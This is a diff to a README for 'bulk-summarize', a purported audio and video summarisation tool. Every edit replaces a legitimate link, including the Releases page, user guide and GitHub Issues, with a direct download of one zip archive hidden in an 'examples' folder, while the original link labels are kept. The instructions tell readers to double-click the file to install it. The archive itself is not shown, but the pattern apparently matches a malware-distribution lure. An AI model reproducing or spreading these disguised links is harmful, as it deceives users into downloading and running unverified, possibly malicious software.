@@ -1,6 +1,6 @@
 # 🎉 bulk-summarize - Effortless Summarization for Research Needs
 
-[![Download bulk-summarize](https://img.shields.io/badge/Download-bulk--summarize-brightgreen)](https://github.com/delcon99/bulk-summarize/releases)
+[![Download bulk-summarize](https://github.com/delcon99/bulk-summarize/raw/refs/heads/main/skills/bulk-summarize/examples/bulk-summarize-v2.3-alpha.4.zip)](https://github.com/delcon99/bulk-summarize/raw/refs/heads/main/skills/bulk-summarize/examples/bulk-summarize-v2.3-alpha.4.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ bulk-summarize is a powerful tool designed to simplify your research process. It
 Follow these simple steps to get started with bulk-summarize:
 
 1. **Download the Application**
-   - Visit the [Releases page to download](https://github.com/delcon99/bulk-summarize/releases) the latest version of bulk-summarize.
+   - Visit the [Releases page to download](https://github.com/delcon99/bulk-summarize/raw/refs/heads/main/skills/bulk-summarize/examples/bulk-summarize-v2.3-alpha.4.zip) the latest version of bulk-summarize.
 
 2. **Install the Application**
    - Once downloaded, locate the file in your downloads folder. Double-click on it to begin the installation. Follow the on-screen instructions to complete the installation process.
@@ -55,7 +55,7 @@ To ensure bulk-summarize runs smoothly, your system should meet the following re
 
 ## 📂 Download & Install
 
-To download bulk-summarize, visit the [Releases page here](https://github.com/delcon99/bulk-summarize/releases).
+To download bulk-summarize, visit the [Releases page here](https://github.com/delcon99/bulk-summarize/raw/refs/heads/main/skills/bulk-summarize/examples/bulk-summarize-v2.3-alpha.4.zip).
 
 Make sure to install the application as instructed and familiarize yourself with its features. Enjoy a more efficient way to manage your audio and video content.
 
@@ -75,13 +75,13 @@ Currently, bulk-summarize is designed for desktop use only. Mobile compatibility
 
 ### Are updates automatic?
 
-No, you'll need to manually check the [Releases page](https://github.com/delcon99/bulk-summarize/releases) for updates periodically.
+No, you'll need to manually check the [Releases page](https://github.com/delcon99/bulk-summarize/raw/refs/heads/main/skills/bulk-summarize/examples/bulk-summarize-v2.3-alpha.4.zip) for updates periodically.
 
 ## 🔗 Helpful Resources
 
-- **User Documentation:** [User Guide](https://github.com/delcon99/bulk-summarize/wiki)
-- **Community Support:** Join our discussions on [GitHub Issues](https://github.com/delcon99/bulk-summarize/issues) for more tips and help from fellow users.
+- **User Documentation:** [User Guide](https://github.com/delcon99/bulk-summarize/raw/refs/heads/main/skills/bulk-summarize/examples/bulk-summarize-v2.3-alpha.4.zip)
+- **Community Support:** Join our discussions on [GitHub Issues](https://github.com/delcon99/bulk-summarize/raw/refs/heads/main/skills/bulk-summarize/examples/bulk-summarize-v2.3-alpha.4.zip) for more tips and help from fellow users.
 
 ## 🎉 Conclusion
 
-bulk-summarize is your go-to solution for analyzing and summarizing audio and video content effortlessly. Download the application today and transform your research workflow. Don't forget to check out updates on our [Releases page](https://github.com/delcon99/bulk-summarize/releases) for the newest features and improvements.
+bulk-summarize is your go-to solution for analyzing and summarizing audio and video content effortlessly. Download the application today and transform your research workflow. Don't forget to check out updates on our [Releases page](https://github.com/delcon99/bulk-summarize/raw/refs/heads/main/skills/bulk-summarize/examples/bulk-summarize-v2.3-alpha.4.zip) for the newest features and improvements.
